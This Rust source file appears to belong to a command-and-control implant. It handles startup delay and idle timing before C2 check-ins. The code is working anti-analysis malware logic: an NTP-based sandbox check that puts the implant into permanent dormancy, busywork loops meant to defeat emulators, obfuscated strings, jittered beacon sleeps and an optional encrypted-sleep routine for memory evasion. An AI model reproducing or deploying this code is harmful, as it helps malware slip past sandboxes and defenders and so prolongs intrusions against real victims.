use std::hint::black_box;
use std::net::UdpSocket;
use std::time::Duration;
use crate::config;
use busywork::{BusyWork, Categories, Intensity, FeedWork};

/// Parsed busywork level. `"off"` / `"none"` skips computational work entirely.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Level {
    Off,
    Low,
    Medium,
    High,
    Ultra,
}

fn level() -> Level {
    match config::busywork_intensity {
        "off" | "none" | "disabled" => Level::Off,
        "low" => Level::Low,
        "high" => Level::High,
        "ultra" => Level::Ultra,
        // "medium" and any unknown value default to Medium
        _ => Level::Medium,
    }
}

fn to_intensity(l: Level) -> Option<Intensity> {
    match l {
        Level::Off => None,
        Level::Low => Some(Intensity::Low),
        Level::Medium => Some(Intensity::Medium),
        Level::High => Some(Intensity::High),
        Level::Ultra => Some(Intensity::Ultra),
    }
}

fn jitter_ms(lo: u64, hi: u64) -> u64 {
    debug_assert!(hi >= lo);
    let mut buf = [0u8; 8];
    let _ = getrandom::getrandom(&mut buf);
    let v = u64::from_le_bytes(buf);
    lo + (v % (hi - lo + 1))
}

fn ntp_timestamp() -> Option<u64> {
    let server = config::ntp_server;
    let socket = UdpSocket::bind(obfstr::obfstr!("0.0.0.0:0")).ok()?;
    socket.set_read_timeout(Some(Duration::from_secs(3))).ok()?;
    socket.set_write_timeout(Some(Duration::from_secs(3))).ok()?;
    let mut packet = [0u8; 48];
    packet[0] = 0x1B;
    socket.send_to(&packet, server).ok()?;
    socket.recv_from(&mut packet).ok()?;
    let secs_since_1900 = u32::from_be_bytes([packet[40], packet[41], packet[42], packet[43]]);
    Some(secs_since_1900 as u64 - 2_208_988_800)
}

fn sandbox_detected() -> bool {
    if !config::ntp_sandbox_check {
        return false;
    }
    let before = match ntp_timestamp() {
        Some(t) => t,
        None => {
            crate::dlog!("ntp: unreachable, skipping sandbox check");
            return false;
        }
    };
    std::thread::sleep(Duration::from_secs(5));
    let after = match ntp_timestamp() {
        Some(t) => t,
        None => {
            crate::dlog!("ntp: second query failed, skipping");
            return false;
        }
    };
    let elapsed = after.saturating_sub(before);
    crate::dlog!("ntp: expected=5s, measured={}s", elapsed);
    elapsed < 2
}

/// Startup delay before first C2 contact.
///
/// Single burst at the configured intensity (not 3×). Ultra/High builds
/// intentionally wait longer before the first check-in; off skips work.
/// Includes one-time NTP sandbox detection when enabled.
pub fn startup_delay() {
    if sandbox_detected() {
        crate::dlog!("ntp: sandbox detected, going dormant");
        loop {
            std::thread::sleep(Duration::from_secs(u64::MAX));
        }
    }

    let Some(i) = to_intensity(level()) else {
        return;
    };
    let uuid = config::UUID.read().unwrap();
    black_box(
        BusyWork::new(i)
            .feed(uuid.as_str())
            .feed(config::callback_host)
            .feed(config::user_agent)
            .run(),
    );
}

/// Sleep replacement between tasking rounds.
///
/// Runs the configured BusyWork burst for evasion, then sleeps for
/// callback_interval seconds with a random jitter fraction applied.
/// Interval=0 fast-polls with a small random yield (lab/debug mode).
pub fn idle() {
    let interval = *config::callback_interval.read().unwrap();
    let jitter_pct = *config::callback_jitter.read().unwrap();

    let l = level();
    if let Some(i) = to_intensity(l) {
        let uuid = config::UUID.read().unwrap();
        black_box(
            BusyWork::new(i)
                .feed(uuid.as_str())
                .feed(config::callback_host)
                .feed(config::user_agent)
                .run(),
        );
    }

    let sleep_ms = if interval == 0 {
        jitter_ms(80, 280)
    } else {
        let base_ms = interval * 1000;
        let jitter_add = if jitter_pct > 0 {
            jitter_ms(0, (base_ms * jitter_pct / 100).max(1))
        } else {
            0
        };
        base_ms + jitter_add
    };
    #[cfg(feature = "ekko")]
    unsafe { crate::sleep_obf::encrypted_sleep(sleep_ms as u32) };
    #[cfg(not(feature = "ekko"))]
    std::thread::sleep(Duration::from_millis(sleep_ms));
}

/// Lightweight ambient noise around real work (crypto, file ops, command start).
///
/// Always **Low** and restricted to COMPUTE|MEMORY so hot paths (many calls
/// per task) cannot re-introduce multi-second stalls. Full intensity belongs
/// in `idle()` / `startup_delay()` only.
///
/// No-op when busywork is `off`.
pub fn churn(data: &(impl FeedWork + ?Sized)) {
    if level() == Level::Off {
        return;
    }
    black_box(
        BusyWork::new(Intensity::Low)
            .allow(Categories::COMPUTE | Categories::MEMORY)
            .feed(data)
            .run(),
    );
}
